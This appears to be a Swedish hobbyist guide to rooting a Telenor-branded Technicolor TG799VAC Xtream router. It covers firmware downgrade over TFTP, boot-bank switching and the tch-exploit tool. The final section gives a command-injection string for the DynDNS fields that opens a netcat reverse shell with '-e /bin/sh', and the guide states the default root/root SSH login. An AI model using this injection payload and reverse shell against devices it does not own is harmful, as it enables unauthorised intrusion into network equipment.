# Root Technicolor TG799VAC-Xtream Telenor

Guide till Root Telenor TG799VAC Xtream > 18.1

Ska försöka göra guiden så lätt som möjlig men lite förkunskaper krävs. 

## Varför root?

Du vill inte ha några bakdörrar i din router.
Du vill kunna göra inställningar som inte annars går pga minimal "hemsida"

## Under konstruktion!

Skriver eftersom hur man gör.

## Start

**Detta är för version > 18.1**


Om du ska kunna roota routern måste vi lägga in en äldre programvara. **17.1** 

## Setup TFTP

Du kan välja mellan t.ex:

Kör du https://github.com/BoLaMN/tch-exploit/releases behövs bara det programmet både för TFTP och root.

sudo ./tch-exploit-linux --ip="192.168.0.2 (din dators ipadress)" --tftp='sökväg till RBI'

eller

sudo ./tch-exploit-linux --eth="en0"--tftp='sökväg vill RBI'



Först ladda ner TFTP så vi kan överföra programvaran.
Download https://bitbucket.org/phjounin/tftpd64/downloads/Tftpd64-4.64-setup.exe

Mjukvara: https://github.com/Vargaskri/Root-Technicolor-TG799VAC-Xtream-Telenor/blob/master/RBI/TN_SWE_TG799vacXtream_17.1.7937-1281014-20180313133921-Official.rbi.torrent

Lägg filen i rooten i TFTP mappen.

Kör TFTP som Administratör. Ändra inställninar som bilderna visar. TFTP kan ibland vara bråkig men bör gå bra. 

![T F T P Settings](images/TFTPSettings.png)

![T F T P Settings2](images/TFTPSettings2.png)

1. Ha routern avslagen.
1. Sätt in en nätverkskabel i port 1 på routern och i dator.
1. Ta ett gem eller nåt att hålla in resetknappen med medans du slår igång routern. Håll in gemet tills ethernetlampan börjar blinka.
1. Nu borde TFTP före över mjukvaran i routern om allt går som de ska.
1. Låt routern få starta upp, logga in och kolla om du har version **17.1**
    1. Om du har det fortsätt **här**
    1. Om **INTE** måste vi byta bootad bank.


## Byta bootad bank!

Såhär byter jag mellan bank_1 och 2.  
Starta ett tidtagarur på datorn eller mobil.
1. Slå på routern och tidtagaruret. 
2. Efter 30 sekunder tryck snabbt på strömknappen (av, på) Om du gjorde rätt kommer alla lampor på routern lysa upp lite svagt sen startar routern om.
3. Starta om tidtagaruret och efter 30 sekunder slå av och routern fort igen. Gör samma sak en gång till därefter låt routern starta upp. Då bör du ha bootat **17.1**


## Själva root delen.

Nu när du har 17.1 skall du använda:

https://github.com/BoLaMN/tch-exploit/releases

Nätverkskabel ska in i WAN(röda porten) på routern. Och routern måste nollställas ifall den blivit använd på internet.

Under Linux:

./tch-exploit-linux

![TCH-Exploit](images/tch1.png)

Följ instruktionerna och byt IP till det som står.
Efter en stund kommer det en massa text då får routern ett IP nummer. En stund senare kommer ännu mera text och va då beredd på att trycka
på **WPS knappen** när det står att du ska göra det. 
Sen är det bara att flytta nätverkskabeln till LAN på routern och logga in med SSH med användare "root" lösenord "root"


Under Windows:

Öppna en kommandotolk som Administratör.

Gå till mappen där ni lagt filerna.

Kör tch-exploit-win.exe

## Version 15.4

Du behöver installera netcat på windows ifall du inte kör linux.

I en terminal skriv **nc -lvvp "port"**
 
Logga in på routern gå till DynDNS:
Klistra in detta på Domain,user,password slå på DynDNS och spara.
**::::::'nc "Din dators IP" "porten du angav i terminalen" -e /bin/sh'**

I din termninal kommer du nu få ett skal.
